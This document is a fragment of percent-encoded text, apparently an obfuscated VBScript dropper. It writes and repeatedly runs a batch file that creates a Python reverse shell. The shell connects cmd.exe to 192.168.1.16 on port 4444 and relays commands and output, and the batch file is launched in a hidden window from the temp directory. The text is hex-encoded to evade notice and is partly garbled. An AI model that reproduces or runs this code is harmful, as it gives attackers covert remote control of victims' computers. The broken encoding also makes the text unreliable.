' 0%20%20%20%20%65%63%68%6f%20%69%6d%70%6f%72%74%20%74%69%6d%65%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%64%65%66%20%72%65%76%5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20
' %20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%70%20%3d%20%73%70%2e%50%6f%70%65%6e%5e
' %28%5b%27%63%6d%64%2e%65%78%65%27%5d%2c%20%73%74%64%69%6e%3d%73%70%2e%50%49%50%45%2c%20%73%74%64%6f%75%74%3d%73%70%2e%50%49%50%45%2c%20%73%74%64%65%72%72%3d%73%70%2e%53%54%44%4f%55%54%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%73%20%3d%20%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%2
' 0%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63
' %68%6f%20%20%20%20%74%72%79%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%73%2e%63%6f%6e%6e%65%63%74%5e%28%5e%28%27%31%39%32%2e%31%36%38%2e%31%2e%31%36%27%2c%20%34%34%34%34%5e%29%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%
' 20%20%65%63%68%6f%20%20%20%20%65%78%63%65%70%74%20%43%6f%6e%6e%65%63%74%69%6f%6e%52%65%66%75%73%65%64%45%72%72%6f%72%20%61%73%20%65%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%70%72%69%6e%74%5e%28%27%72%65%66%75%73%65%64%20%2e%2e%2e%20%43%68%65%63%6b%20%69%66%20%6c%69%73%74%65%6e%65%72%20%69%73%20%72%75%6e%6e%69%6e%67%2e%27%5e%29%22
' %0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%
' 2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%64%65%66%20%73%5f%6f%5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a
' %46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%6f%75%74%70%75%74%20%3d%20%6f%73%2e%72%65%61%64%5e%28%70%2e%73%74%64%6f%75%74%2e%66%69%6c%65%6e%6f%5e%28%5e%29%2c%20%31%30%32%34%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20
' %20%20%20%20%20%20%20%69%66%20%6e%6f%74%20%6f%75%74%70%75%74%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e
' %57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%73%2e%73%65%6e%64%61%6c%6c%5e%28%6f%75%74%70%75%74%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%65%78%63%65%70%74%20%45%78%63%65%70%74%69%6f%6e%20%61%73%20%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%4
' 6%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%72%69%6e%74%5e%28%27%45%72%72%6f%72%20%73%65%6e%64%69%6e%67%20%6f%75%74%70%75%74%3a%27%2c%20%65%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6
' c%65%2e%57%72%69%7
' 4%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%64%65%66%20%72%5f%69
' %5e%28%5e%29%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%64%61%74%61%20%3d%20%73%2
' e%72%65%63%76%5e%28%31%30%32%34%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%6e%6f%74%20%64%61%74%61%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%
' 20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%2e%73%74%64%69%6e%2e%77%72%69%74%65%5e%28%64%61%74%61%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%2e%73%74%64%69%6e%2e%66%6c%75%73%68%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%20%
' 20%20%20%20%20%20%20%65%78%63%65%70%74%20%45%78%63%65%70%74%69%6f%6e%20%61%73%20%65%5e%3a%22%0a%20%20%20%
' 20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65
' %63%68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%70%72%69%6e%74%5e%28%27%45%72%72%6f%72%20%72%65%63%65%69%76%69%6e%67%20%69%6e%70%75%74
' %3a%27%2c%20%65%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63
' %68%6f%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6b%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%
' 6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%
' %20%20%20%20%65%63%68%6f%20%20%20%20%74%68%72%65%61%64%69%6e%67%2e%54%68%72%65%61%64%5e%28%74%61%72%67%65%74%3d%73%5f%6f%2c%20%64%61%65%6d%6f%6e%3d%54%72%75%65%5e%
' 29%2e%73%74%61%72%74%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68
' %6f%20%20%20%20%74%68%72%65%61%64%69%6e%67%2e%54%68%72%65%61%64%5e%28%74%61%72%67%65%74%3d%72%5f%69%2c%20%64%61%65%6d%6f%6e%3d%54%72%75%65%5e%29%2e%73%74%61%72%74%5e%
' 28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20
' %20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%74%69%6d%65%2e%73%6c%65%65%70%5e%28%33%
' 30%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%2e%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%77%68%69%6c%65%20%54%72%75%65%5e%3a%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%72%65%76%5e%28%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%20%20%20%20%65%63%68%6f%20%20%20%20%70%72%69%6e%74%5e%28%27%4c%6f%61%64%69%6e%67%20%2e%2e%2e%27%5e%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%20%29%20%3e%20%25%46%49%4c%45%25%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%29%20%65%6c%73%65%20%28%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%70%79%74%68%6f%6e%20%25%46%49%4c%45%25%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%20%20%20%74%69%6d%65%6f%75%74%20%2f%74%20%36%30%20%3e%6e%75%6c%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%29%22%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%57%72%69%74%65%4c%69%6e%65%20%22%67%6f%74%6f%20%6c%6f%6f%70%22%0a%32%30%25%32%30%25%32%30%25%35%37%25%35%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%32%65%25%35%33%25%36%63%25%36%35%25%36%35%25%37%30%25%32%30%25%33%39%25%33%30%25%33%30%25%33%30%25%33%30%25%33%30%25%30%61%25%34%63%25%36%66%25%36%66%25%37%30%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%46%69%6c%65%2e%43%6c%6f%73%65%0a%20%20%20%20%20%20%20%20%20%20%20%20%6f%62%6a%53%68%65%6c%6c%2e%52%75%6e%20%74%65%6d%70%5f%64%69%72%20%26%20%22%5c%70%72%6f%2e%62%61%74%22%2c%20%30%2c%20%46%61%6c%73%65%0a%20%20%20%20%20%20%20%20%45%6e%64%20%49%66%33%37%34%32%32%32%39%30%61%34%34%36%66%30%61%32%30%0a%20%20%20%20%20%20%20%20%57%53%63%72%69%70%74%2e%53%6c%65%65%70%20%39%30%30%30



        
          
           
       
            
           
